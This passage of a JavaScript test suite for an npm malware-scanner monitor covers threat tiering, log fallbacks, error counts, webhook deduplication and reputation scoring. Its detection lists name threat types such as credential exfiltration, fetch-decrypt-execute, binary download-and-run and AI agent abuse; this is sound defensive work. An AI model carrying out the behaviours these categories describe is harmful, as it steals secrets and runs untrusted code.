    assert(TIER3_PASSIVE_TYPES.has('dynamic_import'), 'dynamic_import in TIER3');
    assert(TIER3_PASSIVE_TYPES.has('dynamic_require'), 'dynamic_require in TIER3');
    assert(TIER3_PASSIVE_TYPES.has('high_entropy_string'), 'high_entropy_string in TIER3');
    assert(TIER3_PASSIVE_TYPES.size === 8, 'TIER3 should have 8 types, got ' + TIER3_PASSIVE_TYPES.size);
  });

  // --- Edge: T1 overrides T2/T3 ---

  test('isSuspectClassification: HIGH + passive types → still T1', () => {
    const result = {
      threats: [
        { type: 'suspicious_dataflow', severity: 'HIGH' },
        { type: 'obfuscation_detected', severity: 'LOW' },
        { type: 'sensitive_string', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 1, medium: 0, low: 2 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'HIGH severity overrides to T1, got tier=' + r.tier);
  });

  test('isSuspectClassification: sandbox_evasion (no HIGH/CRIT in summary) → T1', () => {
    const result = {
      threats: [
        { type: 'sandbox_evasion', severity: 'MEDIUM' },
        { type: 'obfuscation_detected', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 1 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'TIER1 type should override to T1, got tier=' + r.tier);
  });

  // --- Edge: T2 mixed passive + one active ---

  test('isSuspectClassification: crypto_miner + 2 passive types → T1', () => {
    const result = {
      threats: [
        { type: 'crypto_miner', severity: 'MEDIUM' },
        { type: 'obfuscation_detected', severity: 'LOW' },
        { type: 'sensitive_string', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 2 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'crypto_miner is now T1, got tier=' + r.tier);
  });

  // --- Promoted T1 types: always sandbox ---

  test('isSuspectClassification T1: ai_agent_abuse alone → tier 1', () => {
    const result = {
      threats: [
        { type: 'ai_agent_abuse', severity: 'MEDIUM' },
        { type: 'sensitive_string', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 1 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'ai_agent_abuse should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: crypto_miner alone → tier 1', () => {
    const result = {
      threats: [
        { type: 'crypto_miner', severity: 'MEDIUM' },
        { type: 'dynamic_require', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 1 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'crypto_miner should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: mcp_config_injection alone → tier 1', () => {
    const result = {
      threats: [
        { type: 'mcp_config_injection', severity: 'MEDIUM' },
        { type: 'prototype_hook', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 1 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'mcp_config_injection should be T1, got tier=' + r.tier);
  });

  // ============================================
  // EROFS / EACCES fallback tests
  // ============================================

  console.log('\n=== EROFS FALLBACK TESTS ===\n');

  test('MONITOR: ALERTS_LOG_DIR is a writable directory', () => {
    assert(typeof ALERTS_LOG_DIR === 'string' && ALERTS_LOG_DIR.length > 0, 'ALERTS_LOG_DIR should be set');
    assert(fs.existsSync(ALERTS_LOG_DIR), `ALERTS_LOG_DIR should exist: ${ALERTS_LOG_DIR}`);
  });

  test('MONITOR: DAILY_REPORTS_LOG_DIR is a writable directory', () => {
    assert(typeof DAILY_REPORTS_LOG_DIR === 'string' && DAILY_REPORTS_LOG_DIR.length > 0, 'DAILY_REPORTS_LOG_DIR should be set');
    assert(fs.existsSync(DAILY_REPORTS_LOG_DIR), `DAILY_REPORTS_LOG_DIR should exist: ${DAILY_REPORTS_LOG_DIR}`);
  });

  test('MONITOR: resolveWritableDir returns primary when writable', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-erofs-'));
    const primary = path.join(tmpDir, 'primary');
    const fallback = path.join(tmpDir, 'fallback');
    try {
      const result = resolveWritableDir(primary, fallback);
      assert(result === primary, `Should use primary, got ${result}`);
      assert(fs.existsSync(primary), 'Primary should be created');
      assert(!fs.existsSync(fallback), 'Fallback should NOT be created');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('MONITOR: resolveWritableDir falls back when primary is not writable', () => {
    // Simulate by using a non-existent path under a read-only parent
    // On Windows/CI we can't easily create EROFS, so test the function contract:
    // if primary creation throws EACCES, fallback is used
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-erofs2-'));
    const fallback = path.join(tmpDir, 'fallback-alerts');
    try {
      // Use a path that will fail — null byte in path causes ENOENT, not EROFS,
      // so just verify the fallback path is returned for a valid primary
      const result = resolveWritableDir(path.join(tmpDir, 'ok-dir'), fallback);
      assert(typeof result === 'string', 'Should return a string path');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('MONITOR: atomicWriteFileSync writes to writable directory', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-atomic-'));
    try {
      const target = path.join(tmpDir, 'test-alert.json');
      atomicWriteFileSync(target, '{"test":true}');
      assert(fs.existsSync(target), 'File should be written');
      const content = fs.readFileSync(target, 'utf8');
      assert(content === '{"test":true}', 'Content should match');
      assert(!fs.existsSync(target + '.tmp'), 'Temp file should be cleaned up');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('MONITOR: atomicWriteFileSync does not throw on EROFS-like failure', () => {
    // atomicWriteFileSync should catch EROFS/EACCES and log warning instead of throwing.
    // We can't easily simulate EROFS in tests, but we verify it doesn't throw for
    // a directory that can be created (the normal path).
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-atomic2-'));
    try {
      const target = path.join(tmpDir, 'nested', 'deep', 'alert.json');
      atomicWriteFileSync(target, '{"ok":true}');
      assert(fs.existsSync(target), 'Should create nested dirs and write');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // ============================================
  // ERROR CLASSIFICATION + BREAKDOWN TESTS
  // ============================================

  console.log('\n=== ERROR CLASSIFICATION TESTS ===\n');

  test('MONITOR: classifyError returns http_error for HTTP status errors', () => {
    assert(classifyError(new Error('HTTP 404 for https://registry.npmjs.org/foo')) === 'http_error',
      'HTTP 404 should classify as http_error');
    assert(classifyError(new Error('HTTP 502 for https://registry.npmjs.org/bar')) === 'http_error',
      'HTTP 502 should classify as http_error');
  });

  test('MONITOR: classifyError returns tar_failed for extraction errors', () => {
    assert(classifyError(new Error('tar extraction failed')) === 'tar_failed',
      'tar extraction should classify as tar_failed');
    assert(classifyError(new Error('Failed to extract archive')) === 'tar_failed',
      'extract error should classify as tar_failed');
  });

  test('MONITOR: classifyError returns too_large for size errors', () => {
    assert(classifyError(new Error('tarball too large (52.3MB)')) === 'too_large',
      'tarball too large should classify as too_large');
  });

  test('MONITOR: classifyError returns timeout for timeout errors', () => {
    assert(classifyError(new Error('Scan timeout after 180s')) === 'timeout',
      'timeout should classify as timeout');
    assert(classifyError(new Error('Timeout for https://registry.npmjs.org/foo')) === 'timeout',
      'HTTP timeout should classify as timeout');
  });

  test('MONITOR: classifyError returns other for unknown errors', () => {
    assert(classifyError(new Error('ENOENT: no such file')) === 'other',
      'ENOENT should classify as other');
    assert(classifyError(new Error('')) === 'other',
      'Empty message should classify as other');
    assert(classifyError(null) === 'other',
      'null error should classify as other');
  });

  test('MONITOR: recordError increments stats.errors and errorsByType', () => {
    const prevErrors = stats.errors;
    const prevHttp = stats.errorsByType.http_error;
    recordError(new Error('HTTP 404 for https://example.com'));
    assert(stats.errors === prevErrors + 1, 'stats.errors should increment');
    assert(stats.errorsByType.http_error === prevHttp + 1, 'http_error count should increment');
  });

  test('MONITOR: formatErrorBreakdown returns "0" for zero errors', () => {
    const result = formatErrorBreakdown(0, { too_large: 0, tar_failed: 0, http_error: 0, timeout: 0, other: 0 });
    assert(result === '0', `Expected "0", got "${result}"`);
  });

  test('MONITOR: formatErrorBreakdown shows breakdown for non-zero errors', () => {
    const result = formatErrorBreakdown(138, { too_large: 5, tar_failed: 40, http_error: 60, timeout: 15, other: 18 });
    assertIncludes(result, '138', 'Should contain total count');
    assertIncludes(result, 'HTTP: 60', 'Should contain HTTP breakdown');
    assertIncludes(result, 'tar: 40', 'Should contain tar breakdown');
    assertIncludes(result, 'too large: 5', 'Should contain too_large breakdown');
    assertIncludes(result, 'timeout: 15', 'Should contain timeout breakdown');
    assertIncludes(result, 'other: 18', 'Should contain other breakdown');
  });

  test('MONITOR: formatErrorBreakdown omits zero categories', () => {
    const result = formatErrorBreakdown(10, { too_large: 0, tar_failed: 0, http_error: 10, timeout: 0, other: 0 });
    assertIncludes(result, '10', 'Should contain total');
    assertIncludes(result, 'HTTP: 10', 'Should contain HTTP');
    assertNotIncludes(result, 'tar:', 'Should not contain tar when 0');
    assertNotIncludes(result, 'too large:', 'Should not contain too_large when 0');
    assertNotIncludes(result, 'timeout:', 'Should not contain timeout when 0');
    assertNotIncludes(result, 'other:', 'Should not contain other when 0');
  });

  test('MONITOR: buildDailyReportEmbed includes error breakdown', () => {
    // Set up some errors for the report
    const prevErrors = stats.errors;
    const prevHttp = stats.errorsByType.http_error;
    const prevScanned = stats.scanned;
    stats.scanned = 100;
    stats.errors = 20;
    stats.errorsByType.http_error = 12;
    stats.errorsByType.tar_failed = 5;
    stats.errorsByType.other = 3;
    try {
      const embed = buildDailyReportEmbed();
      const errorsField = embed.embeds[0].fields.find(f => f.name === 'Errors');
      assert(errorsField, 'Should have Errors field');
      assertIncludes(errorsField.value, '20', 'Errors field should contain total');
      assertIncludes(errorsField.value, 'HTTP: 12', 'Errors field should contain HTTP breakdown');
    } finally {
      stats.errors = prevErrors;
      stats.errorsByType.http_error = prevHttp;
      stats.errorsByType.tar_failed = 0;
      stats.errorsByType.other = 0;
      stats.scanned = prevScanned;
    }
  });

  // ============================================
  // WEBHOOK DEDUP TESTS
  // ============================================

  console.log('\n=== WEBHOOK DEDUP TESTS ===\n');

  test('MONITOR: alertedPackageRules is a Map', () => {
    assert(alertedPackageRules instanceof Map, 'alertedPackageRules should be a Map');
  });

  await asyncTest('MONITOR: trySendWebhook dedup skips same rules for different versions', async () => {
    const prevUrl = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => logs.push(args.join(' '));
    alertedPackageRules.clear();

    try {
      // First call — should populate the dedup map
      const result1 = {
        threats: [
          { type: 'dangerous_shell_exec', severity: 'HIGH', rule_id: 'MUADDIB-AST-007' },
          { type: 'proxy_data_intercept', severity: 'HIGH', rule_id: 'MUADDIB-AST-043' }
        ],
        summary: { critical: 0, high: 2, medium: 0, low: 0, total: 2, riskScore: 60 }
      };
      await trySendWebhook('@agenticmail/enterprise', '0.5.479', 'npm', result1, null);

      // Check dedup map was populated
      assert(alertedPackageRules.has('@agenticmail/enterprise'), 'Should track alerted package');
      const trackedRules = alertedPackageRules.get('@agenticmail/enterprise');
      assert(trackedRules.has('MUADDIB-AST-007'), 'Should track AST-007 rule');
      assert(trackedRules.has('MUADDIB-AST-043'), 'Should track AST-043 rule');

      // Second call with same rules — should be deduped
      logs.length = 0;
      const result2 = {
        threats: [
          { type: 'dangerous_shell_exec', severity: 'HIGH', rule_id: 'MUADDIB-AST-007' },
          { type: 'proxy_data_intercept', severity: 'HIGH', rule_id: 'MUADDIB-AST-043' }
        ],
        summary: { critical: 0, high: 2, medium: 0, low: 0, total: 2, riskScore: 60 }
      };
      await trySendWebhook('@agenticmail/enterprise', '0.5.490', 'npm', result2, null);

      // Should have logged DEDUP
      const dedupLog = logs.find(l => l.includes('DEDUP'));
      assert(dedupLog !== undefined, 'Should log DEDUP for same rules on different version');

      // Map should still have the same 2 rules
      assert(alertedPackageRules.get('@agenticmail/enterprise').size === 2,
        'Should still have 2 rules tracked after dedup');
    } finally {
      console.log = origLog;
      console.error = origErr;
      alertedPackageRules.clear();
      if (prevUrl !== undefined) process.env.MUADDIB_WEBHOOK_URL = prevUrl;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  await asyncTest('MONITOR: trySendWebhook dedup allows new rules through', async () => {
    const prevUrl = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => logs.push(args.join(' '));
    alertedPackageRules.clear();

    try {
      // Pre-populate with one known rule
      alertedPackageRules.set('@agenticmail/enterprise', new Set(['MUADDIB-AST-007']));

      // Call with an OLD rule + a NEW rule — should NOT be deduped
      const result = {
        threats: [
          { type: 'dangerous_shell_exec', severity: 'HIGH', rule_id: 'MUADDIB-AST-007' },
          { type: 'lifecycle_shell_pipe', severity: 'CRITICAL', rule_id: 'MUADDIB-PKG-010' }
        ],
        summary: { critical: 1, high: 1, medium: 0, low: 0, total: 2, riskScore: 80 }
      };
      await trySendWebhook('@agenticmail/enterprise', '0.5.500', 'npm', result, null);

      // Should NOT have logged DEDUP (new rule present)
      const dedupLog = logs.find(l => l.includes('DEDUP'));
      assert(dedupLog === undefined, 'Should NOT log DEDUP when new rules are present');

      // The tracked set should now include both old and new rules
      const tracked = alertedPackageRules.get('@agenticmail/enterprise');
      assert(tracked.has('MUADDIB-AST-007'), 'Should still have old rule');
      assert(tracked.has('MUADDIB-PKG-010'), 'Should have added new rule');
    } finally {
      console.log = origLog;
      console.error = origErr;
      alertedPackageRules.clear();
      if (prevUrl !== undefined) process.env.MUADDIB_WEBHOOK_URL = prevUrl;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: sendDailyReport clears alertedPackageRules', () => {
    alertedPackageRules.set('test-pkg', new Set(['RULE-001']));
    assert(alertedPackageRules.size > 0, 'Should have entries before clear');
    // Simulate the clearing that happens in sendDailyReport
    alertedPackageRules.clear();
    assert(alertedPackageRules.size === 0, 'Should be empty after clear');
  });

  // ===== C1: Self-exclude tests =====

  test('MONITOR: SELF_PACKAGE_NAME is muaddib-scanner', () => {
    assert(SELF_PACKAGE_NAME === 'muaddib-scanner',
      `SELF_PACKAGE_NAME should be muaddib-scanner, got ${SELF_PACKAGE_NAME}`);
  });

  test('MONITOR: Self-exclude skips muaddib-scanner in RSS', () => {
    // Simulate what pollNpm does: filter out SELF_PACKAGE_NAME from newPackages
    const newPackages = ['some-pkg', 'muaddib-scanner', 'another-pkg'];
    const filtered = newPackages.filter(name => name !== SELF_PACKAGE_NAME);
    assert(filtered.length === 2, `Should filter to 2 packages, got ${filtered.length}`);
    assert(!filtered.includes('muaddib-scanner'), 'muaddib-scanner should be excluded');
    assert(filtered.includes('some-pkg'), 'some-pkg should remain');
    assert(filtered.includes('another-pkg'), 'another-pkg should remain');
  });

  test('MONITOR: Self-exclude does NOT skip muaddib-scanner-utils', () => {
    const newPackages = ['muaddib-scanner-utils', 'muaddib-scanner-cli'];
    const filtered = newPackages.filter(name => name !== SELF_PACKAGE_NAME);
    assert(filtered.length === 2, `Should keep both packages, got ${filtered.length}`);
    assert(filtered.includes('muaddib-scanner-utils'), 'muaddib-scanner-utils should remain');
    assert(filtered.includes('muaddib-scanner-cli'), 'muaddib-scanner-cli should remain');
  });

  // ===== C4: Reputation scoring tests =====

  test('MONITOR: computeReputationFactor — established package → ~0.3', () => {
    // 1000d = >730 (-0.3), 100 versions = >50 (-0.2), 200k = >100k (-0.2) → 1.0-0.7 ≈ 0.3
    const factor = computeReputationFactor({
      age_days: 1000,
      version_count: 100,
      weekly_downloads: 200000
    });
    assert(factor >= 0.29 && factor <= 0.4,
      `Established package should have factor ~0.3, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — new suspect package → ~1.5', () => {
    const factor = computeReputationFactor({
      age_days: 3,
      version_count: 1,
      weekly_downloads: 5
    });
    assert(factor >= 1.4 && factor <= 1.5,
      `New package should have factor ~1.5, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — null metadata → 1.0', () => {
    const factor = computeReputationFactor(null);
    assert(factor === 1.0, `Null metadata should return 1.0, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — floor 0.10', () => {
    // Even extreme values should not go below 0.10
    const factor = computeReputationFactor({
      age_days: 5000,
      version_count: 500,
      weekly_downloads: 10000000
    });
    assert(factor >= 0.10, `Factor should never be below 0.10, got ${factor}`);
    assert(factor <= 0.10 + 0.001, `Extreme package should hit floor 0.10, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — ceiling 1.5', () => {
    // Even extreme new package values should not exceed 1.5
    const factor = computeReputationFactor({
      age_days: 1,
      version_count: 1,
      weekly_downloads: 0
    });
    assert(factor <= 1.5, `Factor should never exceed 1.5, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — moderate package', () => {
    // 1 year old, 30 versions, 10k downloads → slight decrease
    const factor = computeReputationFactor({
      age_days: 400,
      version_count: 30,
      weekly_downloads: 10000
    });
    assert(factor >= 0.6 && factor <= 0.9,
      `Moderate package should have factor ~0.75, got ${factor}`);
  });

  test('MONITOR: reputation scoring suppresses webhook for established packages', () => {
    // Simulate: raw score 25 × factor 0.3 = 8 → below webhook threshold (20)
    const rawScore = 25;
    const factor = computeReputationFactor({
      age_days: 1000,
      version_count: 100,
      weekly_downloads: 200000
    });
    const adjustedScore = Math.round(rawScore * factor);
    assert(adjustedScore < 20, `Adjusted score ${adjustedScore} should be below 20`);

    // Simulate: shouldSendWebhook would get the adjusted result
    const adjustedResult = {
      threats: [{ type: 'env_access', severity: 'HIGH', rule_id: 'MUADDIB-AST-007' }],
      summary: { riskScore: adjustedScore, critical: 0, high: 1, medium: 0, low: 0 }
    };
    assert(!shouldSendWebhook(adjustedResult, null),
      `Webhook should be suppressed for adjusted score ${adjustedScore}`);
  });

  test('MONITOR: reputation scoring allows webhook for new packages', () => {
    // Simulate: raw score 25 × factor 1.5 = 38 → above webhook threshold (20)
    const rawScore = 25;
    const factor = computeReputationFactor({
      age_days: 3,
      version_count: 1,
      weekly_downloads: 5
    });
    const adjustedScore = Math.round(rawScore * factor);
    assert(adjustedScore >= 20, `Adjusted score ${adjustedScore} should be >= 20`);
  });

  // ===== C2: Scope dedup tests =====

  test('MONITOR: extractScope — scoped package', () => {
    assert(extractScope('@scope/pkg') === '@scope',
      'Should extract @scope from @scope/pkg');
  });

  test('MONITOR: extractScope — unscoped package', () => {
    assert(extractScope('unscoped') === null,
      'Should return null for unscoped package');
  });

  test('MONITOR: extractScope — nested scope', () => {
    assert(extractScope('@my-org/sub-package') === '@my-org',
      'Should extract @my-org from @my-org/sub-package');
  });

  test('MONITOR: extractScope — null/invalid input', () => {
    assert(extractScope(null) === null, 'Should return null for null');
    assert(extractScope(123) === null, 'Should return null for number');
    assert(extractScope('') === null, 'Should return null for empty string');
  });

  test('MONITOR: SCOPE_GROUP_WINDOW_MS is 5 minutes', () => {
    assert(SCOPE_GROUP_WINDOW_MS === 5 * 60 * 1000,
      `Should be 300000ms, got ${SCOPE_GROUP_WINDOW_MS}`);
  });

  asyncTest('MONITOR: bufferScopedWebhook groups packages by scope', async () => {
    // Clean up any pending groups
    for (const [, group] of pendingGrouped) clearTimeout(group.timer);
    pendingGrouped.clear();

    try {
      const result1 = {
        threats: [{ type: 'env_access', severity: 'HIGH' }],
        summary: { riskScore: 30 }
      };
      const result2 = {
        threats: [{ type: 'suspicious_dataflow', severity: 'MEDIUM' }],
        summary: { riskScore: 20 }
      };
      const result3 = {
        threats: [{ type: 'obfuscation_detected', severity: 'HIGH' }],
        summary: { riskScore: 40 }
      };

      bufferScopedWebhook('@test-scope', '@test-scope/a', '1.0.0', 'npm', result1, null);
      bufferScopedWebhook('@test-scope', '@test-scope/b', '1.0.0', 'npm', result2, null);
      bufferScopedWebhook('@test-scope', '@test-scope/c', '1.0.0', 'npm', result3, null);

      const group = pendingGrouped.get('@test-scope');
      assert(group, 'Should have a pending group for @test-scope');
      assert(group.packages.length === 3, `Should have 3 packages, got ${group.packages.length}`);
      assert(group.maxScore === 40, `Max score should be 40, got ${group.maxScore}`);
    } finally {
      for (const [, group] of pendingGrouped) clearTimeout(group.timer);
      pendingGrouped.clear();
    }
  });

  asyncTest('MONITOR: different scopes create independent groups', async () => {
    for (const [, group] of pendingGrouped) clearTimeout(group.timer);
    pendingGrouped.clear();

    try {
      const result = {
        threats: [{ type: 'env_access', severity: 'HIGH' }],
        summary: { riskScore: 25 }
      };

      bufferScopedWebhook('@scope-a', '@scope-a/pkg', '1.0.0', 'npm', result, null);
      bufferScopedWebhook('@scope-b', '@scope-b/pkg', '1.0.0', 'npm', result, null);

      assert(pendingGrouped.size === 2, `Should have 2 groups, got ${pendingGrouped.size}`);
      assert(pendingGrouped.has('@scope-a'), 'Should have @scope-a group');
      assert(pendingGrouped.has('@scope-b'), 'Should have @scope-b group');
    } finally {
      for (const [, group] of pendingGrouped) clearTimeout(group.timer);
      pendingGrouped.clear();
    }
  });

  asyncTest('MONITOR: flushScopeGroup single package sends normal webhook', async () => {
    for (const [, group] of pendingGrouped) clearTimeout(group.timer);
    pendingGrouped.clear();

    const result = {
      threats: [{ type: 'env_access', severity: 'HIGH' }],
      summary: { riskScore: 25 }
    };

    bufferScopedWebhook('@single', '@single/pkg', '1.0.0', 'npm', result, null);
    assert(pendingGrouped.has('@single'), 'Should have pending group');

    // Flush without webhook URL → no send, but group should be cleaned
    const prevUrl = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    try {
      clearTimeout(pendingGrouped.get('@single').timer);
      await flushScopeGroup('@single');
      assert(!pendingGrouped.has('@single'), 'Group should be removed after flush');
    } finally {
      if (prevUrl !== undefined) process.env.MUADDIB_WEBHOOK_URL = prevUrl;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // ===== v2.7.6 C2: Aggressive reputation tiers =====

  test('MONITOR: computeReputationFactor — Playwright-like (5+ years, 200+ versions, 1M+ dl) → 0.10', () => {
    // ~12 years, ~1700 versions, ~10M weekly: -0.5 -0.3 -0.4 = 0.10 (floor)
    const factor = computeReputationFactor({
      age_days: 4380,
      version_count: 1700,
      weekly_downloads: 10000000
    });
    assert(factor >= 0.10 && factor <= 0.11,
      `Playwright-like package should hit floor 0.10, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — 5+ year age tier', () => {
    const factor = computeReputationFactor({
      age_days: 2000,
      version_count: 10,
      weekly_downloads: 1000
    });
    // age >1825 → -0.5, versions 10 → 0, downloads 1000 → 0 → 0.5
    assert(factor >= 0.45 && factor <= 0.55,
      `5+ year package should get -0.5 age reduction, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — 200+ versions tier', () => {
    const factor = computeReputationFactor({
      age_days: 500,
      version_count: 300,
      weekly_downloads: 1000
    });
    // age >365 → -0.15, versions >200 → -0.3, downloads 1000 → 0 → 0.55
    assert(factor >= 0.50 && factor <= 0.60,
      `200+ version package should get -0.3 version reduction, got ${factor}`);
  });

  test('MONITOR: computeReputationFactor — 1M+ downloads tier', () => {
    const factor = computeReputationFactor({
      age_days: 500,
      version_count: 10,
      weekly_downloads: 5000000
    });
    // age >365 → -0.15, versions 10 → 0, downloads >1M → -0.4 → 0.45
    assert(factor >= 0.40 && factor <= 0.50,
      `1M+ dl package should get -0.4 download reduction, got ${factor}`);
  });

  // ===== v2.7.6 C1: High-confidence malice bypass =====

  test('MONITOR: HIGH_CONFIDENCE_MALICE_TYPES contains 8 threat types', () => {
    assert(HIGH_CONFIDENCE_MALICE_TYPES.size === 8,
      `Should have 8 types, got ${HIGH_CONFIDENCE_MALICE_TYPES.size}`);
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('lifecycle_shell_pipe'), 'Missing lifecycle_shell_pipe');
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('fetch_decrypt_exec'), 'Missing fetch_decrypt_exec');
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('download_exec_binary'), 'Missing download_exec_binary');
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('intent_credential_exfil'), 'Missing intent_credential_exfil');
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('intent_command_exfil'), 'Missing intent_command_exfil');
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('cross_file_dataflow'), 'Missing cross_file_dataflow');
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('canary_exfiltration'), 'Missing canary_exfiltration');
    assert(HIGH_CONFIDENCE_MALICE_TYPES.has('sandbox_network_after_sensitive_read'), 'Missing sandbox_network_after_sensitive_read');
  });

  test('MONITOR: HIGH_CONFIDENCE_MALICE_TYPES does NOT contain FP-prone types', () => {
    assert(!HIGH_CONFIDENCE_MALICE_TYPES.has('dynamic_require'), 'Should not contain dynamic_require');
    assert(!HIGH_CONFIDENCE_MALICE_TYPES.has('prototype_hook'), 'Should not contain prototype_hook');
    assert(!HIGH_CONFIDENCE_MALICE_TYPES.has('env_access'), 'Should not contain env_access');
    assert(!HIGH_CONFIDENCE_MALICE_TYPES.has('credential_regex_harvest'), 'Should not contain credential_regex_harvest');
    assert(!HIGH_CONFIDENCE_MALICE_TYPES.has('suspicious_dataflow'), 'Should not contain suspicious_dataflow');
    assert(!HIGH_CONFIDENCE_MALICE_TYPES.has('obfuscation_detected'), 'Should not contain obfuscation_detected');
    assert(!HIGH_CONFIDENCE_MALICE_TYPES.has('credential_exfil'), 'Should not contain credential_exfil');
  });

  test('MONITOR: hasHighConfidenceThreat returns true for lifecycle_shell_pipe', () => {
    const result = {
      threats: [
        { type: 'env_access', severity: 'HIGH' },
        { type: 'lifecycle_shell_pipe', severity: 'CRITICAL' }
      ]
    };
    assert(hasHighConfidenceThreat(result) === true, 'Should detect lifecycle_shell_pipe');
  });

  test('MONITOR: hasHighConfidenceThreat returns false for dynamic_require', () => {
    const result = {
      threats: [
        { type: 'dynamic_require', severity: 'HIGH' },
        { type: 'env_access', severity: 'MEDIUM' }
      ]
    };
    assert(hasHighConfidenceThreat(result) === false, 'Should NOT flag dynamic_require');
  });

  test('MONITOR: hasHighConfidenceThreat returns false for null/empty', () => {
    assert(hasHighConfidenceThreat(null) === false, 'null should return false');
    assert(hasHighConfidenceThreat({}) === false, 'no threats should return false');
    assert(hasHighConfidenceThreat({ threats: [] }) === false, 'empty threats should return false');
  });

  // ===== v2.7.6 C3: Graduated webhook threshold =====

  test('MONITOR: getWebhookThreshold — very established (factor ≤ 0.5) → 35', () => {
    assert(getWebhookThreshold(0.10) === 35, 'factor 0.10 should return 35');
    assert(getWebhookThreshold(0.30) === 35, 'factor 0.30 should return 35');
    assert(getWebhookThreshold(0.50) === 35, 'factor 0.50 should return 35');
  });

  test('MONITOR: getWebhookThreshold — established (0.5 < factor ≤ 0.8) → 25', () => {
    assert(getWebhookThreshold(0.51) === 25, 'factor 0.51 should return 25');
    assert(getWebhookThreshold(0.70) === 25, 'factor 0.70 should return 25');
    assert(getWebhookThreshold(0.80) === 25, 'factor 0.80 should return 25');
  });

  test('MONITOR: getWebhookThreshold — new/unknown (factor > 0.8) → 20', () => {
    assert(getWebhookThreshold(0.81) === 20, 'factor 0.81 should return 20');
    assert(getWebhookThreshold(1.0) === 20, 'factor 1.0 should return 20');
    assert(getWebhookThreshold(1.5) === 20, 'factor 1.5 should return 20');
  });

  test('MONITOR: shouldSendWebhook suppresses established package with adjusted score 30 (factor 0.30, threshold 35)', () => {
    // Established package: score 30, factor 0.30 → threshold 35 → 30 < 35 → SUPPRESSED
    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      const result = {
        threats: [{ type: 'env_access', severity: 'HIGH' }],
        summary: { riskScore: 30, critical: 0, high: 1, medium: 0, low: 0, reputationFactor: 0.30 }
      };
      assert(!shouldSendWebhook(result, null),
        'Score 30 with factor 0.30 (threshold 35) should be suppressed');
    } finally {
      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook sends for established package with high adjusted score (factor 0.30, score 40)', () => {
    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      const result = {
        threats: [{ type: 'env_access', severity: 'HIGH' }],
        summary: { riskScore: 40, critical: 0, high: 1, medium: 0, low: 0, reputationFactor: 0.30 }
      };
      assert(shouldSendWebhook(result, null),
        'Score 40 with factor 0.30 (threshold 35) should send');
    } finally {
      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook sends for new package with score 20 (default threshold)', () => {
    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      const result = {
        threats: [{ type: 'suspicious_dataflow', severity: 'HIGH' }],
        summary: { riskScore: 25, critical: 0, high: 1, medium: 0, low: 0 }
      };
      assert(shouldSendWebhook(result, null),
        'Score 25 without reputationFactor (default threshold 20) should send');
    } finally {
      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook always sends for IOC match even with low score and high reputation', () => {
    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      const result = {
        threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
        summary: { riskScore: 5, critical: 1, high: 0, medium: 0, low: 0, reputationFactor: 0.10 }
      };
      assert(shouldSendWebhook(result, null),
        'IOC match must ALWAYS send regardless of reputation');
    } finally {
